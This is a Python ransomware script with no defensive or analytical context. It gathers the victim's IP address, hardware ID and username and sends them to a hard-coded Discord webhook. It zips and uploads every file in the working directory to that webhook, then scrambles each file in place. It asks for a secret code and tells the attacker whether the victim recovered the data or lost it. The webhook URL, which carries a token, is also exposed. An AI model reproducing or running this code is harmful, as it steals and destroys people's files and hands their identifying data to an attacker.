import time,os,math,random
try:
    import colorama
    import discord_webhook
    import requests
    import subprocess
    import threading
    from zipfile import ZipFile
except ModuleNotFoundError as e:
    os.system('pip install colorama')
    os.system('pip install discord-webhook')
import colorama
import discord_webhook
os.system('cls')
import sys
import threading
import requests
import discord
from time import sleep as wait
from colorama import Fore,Style, init
def get_all_files(directory):
    all_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files
init(True)
print(Fore.GREEN+Style.BRIGHT+"Welcome, loading user data..")
ip = requests.get('https://api.ipify.org').content.decode('utf8')
import subprocess
from datetime import datetime
hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
from discord_webhook import DiscordWebhook, DiscordEmbed
import zipfile
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1259258085273243738/th4Pf5yQI8Hp9w6xJYN7TKsK_sNhe9_Cyhyr4jn9hgGLuoGvVLtXp6OkSGZbpCwO9O6B")

# create embed object for webhook
# you can set the color as a decimal (color=242424) or hex (color="03b2f8") number
embed = DiscordEmbed(title="Victim", description="We have yet another one..", color="03b2f8")
embed.add_embed_field(name="HWID ID", value=f"{hwid}",inline=False)
embed.add_embed_field(name="User", value=f"{os.getlogin().capitalize()}",inline=False)
embed.add_embed_field(name="Ip Address", value=f"{ip}",inline=False)
embed.add_embed_field('Time',f'{datetime.now()}',False)
secretcode = random.randint(11111111,99999999)
embed.add_embed_field('Secret Code :shushing_face:',f'||**{secretcode}**||',False)
files = get_all_files(os.getcwd())
def create_zip(files, zip_filename):
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for file in files:
            zipf.write(file)
        zipf.close()

# Function to send the zip file to a Discord webhook
def send_zip_to_discord(zip_filename, webhook_url):
    webhook = DiscordWebhook(url=webhook_url)
    with open(zip_filename, 'rb') as f:
        webhook.add_file(file=f.read(), filename=os.path.basename(zip_filename))
    response = webhook.execute()
    
files_to_zip = []
for file in files:
    if file == f"{os.getcwd()}\\main.pyw":
        continue
    if file == f"{sys.argv[0]}":
        continue
    if file == f"{os.getcwd()}\\main.py":
        continue
    if file == f"{os.getcwd()}\\rndom.pyw":
        continue
    if file == f"{os.getcwd()}\\maker.pyw":
        continue
    if file == f"{os.getcwd()}\\launcher.py":
        continue
    files_to_zip.append(file)

# add embed object to webhook
webhook.add_embed(embed)


# Name of the zip file to create
zip_filename = 'C:\\Users\\Public\\Documents\\files.zip'

# Create the zip file
create_zip(files_to_zip, zip_filename)

# Discord webhook URL to send the zip file
webhook_url = 'https://discord.com/api/webhooks/1259258085273243738/th4Pf5yQI8Hp9w6xJYN7TKsK_sNhe9_Cyhyr4jn9hgGLuoGvVLtXp6OkSGZbpCwO9O6B'

# Send the zip file to Discord
send_zip_to_discord(zip_filename, webhook_url)
os.remove(zip_filename)
response = webhook.execute()
encryptor1 = 7
encryptor2 = 4
encryptor3 = 6

gooddata = []
baddata = []
fileid = []

encryptors = [encryptor1,encryptor2,encryptor3]

index = 0

def change_letter(letter, x):
    # Step 1: Get the ASCII number of the letter
    ascii_number = ord(letter)
    
    # Step 2: Change the ASCII number by x
    new_ascii_number = ascii_number + x
    
    # Step 3: Convert the new ASCII number back to a letter
    new_letter = chr(new_ascii_number)
    
    return new_letter


    

def doit(file):
    try:
        x = open(file,'r',errors='ignore')
    
        content = x.read()

        global gooddata
        global baddata
        global fileid

        gooddata.append(content)
        contentsplit = list(content)
        nc = ""
        oc = ""
        index = 0
        for i in contentsplit:
            nc = f"{nc}{change_letter(i,encryptors[index])}"
            index+=1
            if index == 3:
                index = 0
        index = 0
        for i in nc:
            oc = f"{oc}{change_letter(i,-encryptors[index])}"
            index+=1
            if index == 3:
                index = 0
        x.close()
        x = open(file,'w',errors='ignore')
        baddata.append(nc)
        yes = False
        while yes != True:
            try:
                x.write(nc)
                yes = True
            except Exception as e:
                print(e)
        x.close()
        fileid.append(file)
    
    except:
        return



threads = []
# Example usage
current_directory = os.getcwd()
files = get_all_files(current_directory)
threads = []
for file in files:
    if file == f"{os.getcwd()}\\main.pyw":
        continue
    if file == f"{sys.argv[0]}":
        continue
    if file == f"{os.getcwd()}\\main.py":
        continue
    if file == f"{os.getcwd()}\\rndom.pyw":
        continue
    if file == f"{os.getcwd()}\\maker.pyw":
        continue
    if file == f"{os.getcwd()}\\launcher.py":
        continue

    x = threading.Thread(target=doit,args=(file,))
    x.start()
    x.is_alive()
    x.join(10)
    threads.append(x)
    with ZipFile('files.zip', 'w') as zip_object:
        zip_object.write(file)
    




for file in fileid:
    print(f"• {file}")

print("\n\n\n\n")
print("""
▀█▀ █░█ █▀▀ █▀ █▀▀   █▀▀ █ █░░ █▀▀ █▀   █░█ ▄▀█ █▀   █▄▄ █▀▀ █▀▀ █▄░█   █▀▀ █▄░█ █▀▀ █▀█ █▄█ █▀█ ▀█▀ █▀▀ █▀▄ ░
░█░ █▀█ ██▄ ▄█ ██▄   █▀░ █ █▄▄ ██▄ ▄█   █▀█ █▀█ ▄█   █▄█ ██▄ ██▄ █░▀█   ██▄ █░▀█ █▄▄ █▀▄ ░█░ █▀▀ ░█░ ██▄ █▄▀ ▄

█▀▀ █▄░█ ▀█▀ █▀▀ █▀█   █▀ █▀▀ █▀▀ █▀█ █▀▀ ▀█▀   █▀▀ █▀█ █▀▄ █▀▀   ▀█▀ █▀█   █▀▄ █▀▀ █▀▀ █▀█ █▄█ █▀█ ▀█▀ ░
██▄ █░▀█ ░█░ ██▄ █▀▄   ▄█ ██▄ █▄▄ █▀▄ ██▄ ░█░   █▄▄ █▄█ █▄▀ ██▄   ░█░ █▄█   █▄▀ ██▄ █▄▄ █▀▄ ░█░ █▀▀ ░█░ ▄""")

print("""\n\n
░░███╗░░  ████████╗██████╗░██╗░░░██╗  ░█████╗░███╗░░██╗██╗░░░░░██╗░░░██╗██╗██╗██╗
░████║░░  ╚══██╔══╝██╔══██╗╚██╗░██╔╝  ██╔══██╗████╗░██║██║░░░░░╚██╗░██╔╝██║██║██║
██╔██║░░  ░░░██║░░░██████╔╝░╚████╔╝░  ██║░░██║██╔██╗██║██║░░░░░░╚████╔╝░██║██║██║
╚═╝██║░░  ░░░██║░░░██╔══██╗░░╚██╔╝░░  ██║░░██║██║╚████║██║░░░░░░░╚██╔╝░░╚═╝╚═╝╚═╝
███████╗  ░░░██║░░░██║░░██║░░░██║░░░  ╚█████╔╝██║░╚███║███████╗░░░██║░░░██╗██╗██╗
╚══════╝  ░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░  ░╚════╝░╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝╚═╝╚═╝""")
threads=[]
zip_object.close()

sc = input(">>> ")
if sc == str(secretcode):
    print("Decrypting..")
    index_ = 0
    for xfile in fileid:
        x = open(xfile,'w',errors='ignore')
        x.write(gooddata[index_])
        index_+=1
    print("Your files have been decrypted!")
    embed = DiscordEmbed(title="Finalized", description="Victim has decrypted his data", color="03b2f8")
    embed.add_embed_field(name="HWID ID", value=f"{hwid}",inline=False)
    embed.add_embed_field(name="User", value=f"{os.getlogin().capitalize()}",inline=False)
    embed.add_embed_field(name="Ip Address", value=f"{ip}",inline=False)
    embed.add_embed_field('Time',f'{datetime.now()}',False)

    # add embed object to webhook
    webhook.add_embed(embed)

    response = webhook.execute()
else:
    print("Incorrect code. These file are forever lost!")
    embed = DiscordEmbed(title="Bro done for.", description="Victim has lost his data", color="03b2f8")
    embed.add_embed_field(name="HWID ID", value=f"{hwid}",inline=False)
    embed.add_embed_field(name="User", value=f"{os.getlogin().capitalize()}",inline=False)
    embed.add_embed_field(name="Ip Address", value=f"{ip}",inline=False)
    embed.add_embed_field('Time',f'{datetime.now()}',False)

    # add embed object to webhook
    webhook.add_embed(embed)

    response = webhook.execute()